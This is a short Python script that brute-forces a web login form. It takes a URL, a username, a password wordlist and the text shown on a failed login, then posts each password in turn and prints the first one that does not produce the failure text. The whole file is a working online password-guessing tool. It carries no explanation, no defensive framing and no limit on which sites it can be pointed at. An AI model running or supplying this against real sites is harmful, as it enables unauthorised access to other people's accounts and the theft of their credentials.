import requests
url = input('Enter URL: ')
username = input('Enter username: ')
passwdfile = input('Enter name of password file to use: ')
login_failed_string = input('Enter the string that occurs when login fails: ')

def cracking(username,url):
    for password in passwords:
        password = password.strip()
        print('Trying: ' + password)
        data = {'username':username,'password':password,'Login':'submit'}
        response = requests.post(url,data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print('Found username ' + '==>' + username)
            print('Found password '+ '==>' + password)
            exit()

with open(passwdfile,'r') as passwords:
    cracking(username,url)
    print('No match found')



